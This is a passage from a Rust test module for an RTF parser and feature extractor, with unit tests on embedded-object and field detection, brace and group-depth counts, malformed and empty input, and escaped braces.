            all.iter().any(|v| v.contains("objdata")),
            "file's own strings were discarded: {all:?}"
        );
    }

    #[test]
    fn features_include_object_and_field() {
        let rtf = b"{\\rtf1\\ansi {\\object\\objemb}{\\field foo}}";
        let (v, _) = extract_rtf(rtf);
        let feats = v.get("rtf.features").and_then(|x| x.as_array()).unwrap();
        let names: Vec<&str> = feats.iter().filter_map(|x| x.as_str()).collect();
        assert!(names.contains(&"object"));
        assert!(names.contains(&"objemb"));
        assert!(names.contains(&"field"));
    }

    #[test]
    fn shape_counts_braces_and_control_words() {
        let rtf = b"{\\rtf1\\ansi {\\info{\\author X}}}";
        let (v, m) = extract_rtf(rtf);
        let shape = v.get("rtf.shape").and_then(|x| x.as_object()).unwrap();
        assert!(shape.get("brace_count").and_then(|x| x.as_u64()).unwrap() >= 4);
        assert!(
            shape
                .get("group_depth_max")
                .and_then(|x| x.as_u64())
                .unwrap()
                >= 2
        );
        assert!(m.get("rtf.control_word_count").unwrap() > 0.0);
    }

    #[test]
    fn no_magic_is_silent() {
        let (v, _) = extract_rtf(b"not an rtf");
        assert!(v.get("rtf.version").is_none());
    }

    #[test]
    fn unterminated_group_doesnt_crash() {
        // Opening brace + magic but no matching close — match_group_end
        // returns bytes.len() so we should still parse the prefix without
        // panic.
        let (v, _) = extract_rtf(b"{\\rtf1\\ansi {\\info{\\author Mallory");
        assert_eq!(v.get("rtf.version").and_then(|x| x.as_str()), Some("1"));
    }

    #[test]
    fn empty_input_is_silent() {
        let (v, _) = extract_rtf(b"");
        assert!(v.get("rtf.version").is_none());
    }

    #[test]
    fn escaped_braces_dont_unbalance_depth() {
        // `\{` and `\}` are escaped — they should not change brace depth.
        let rtf = b"{\\rtf1\\ansi {\\info{\\author A\\{B\\}C}}}";
        let (v, _) = extract_rtf(rtf);
        // Backslash-escaped braces are decoded as literal `{` and `}`.
        assert_eq!(
            v.get("rtf.info.author").and_then(|x| x.as_str()),
            Some("A{B}C")
        );
    }
}
